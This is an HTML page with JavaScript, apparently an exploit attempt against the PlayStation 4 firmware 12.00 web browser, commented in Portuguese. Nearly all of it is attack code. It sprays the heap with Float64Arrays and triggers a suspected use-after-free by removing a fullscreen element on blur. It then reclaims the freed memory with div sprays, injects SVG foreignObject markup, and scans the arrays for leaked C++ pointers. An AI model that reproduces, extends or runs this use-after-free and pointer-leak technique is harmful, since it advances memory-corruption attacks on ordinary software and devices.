<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - C++ Pointer Hunter</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → C++ Pointer Hunter</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 HEAP SETUP (SUA FUNÇÃO ORIGINAL - A NOSSA REDE DE CAPTURA)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i; // Cada array começa com o seu próprio número de ID
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO - Minificado)
function inject(child){
    try{
        child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 POINTER HUNTER (O SCANNER REAL)
function domOverlapProbe(){
    log("---- HUNTING FOR C++ POINTERS ----");

    try{
        // Nós ignoramos o DOM completamente e olhamos apenas para a memória do JS
        if(!window.heap_press) return;

        for(let i=0; i<window.heap_press.length; i++){
            
            // O valor original era 'i'. Se o motor C++ tocou aqui por causa do UAF,
            // esse valor vai ser substituído por um ponteiro de memória gigante!
            if(window.heap_press[i][0] !== i){
                
                log("[$$$] JACKPOT! VAZAMENTO C++ DETECTADO!");
                log("[$$$] O Array ID " + i + " foi sobrescrito pelo motor!");
                
                // Esse número decimal maluco É o endereço de memória real
                log("[$$$] Ponteiro Cru (Float): " + window.heap_press[i][0]);
                
                return; // Paramos a busca
            }
        }
        
        log("[SCAN] Arrays intactos neste ciclo...");

    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    // O Probe agora não precisa mais do fsTarget, ele vasculha o heap global
    setTimeout(()=>domOverlapProbe(), 80);
    setTimeout(()=>domOverlapProbe(), 180);
    setTimeout(()=>domOverlapProbe(), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando Pointer Hunter...");
    
    // Cria a nossa "rede" de Float64Arrays
    window.heap_press = setupHeap(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
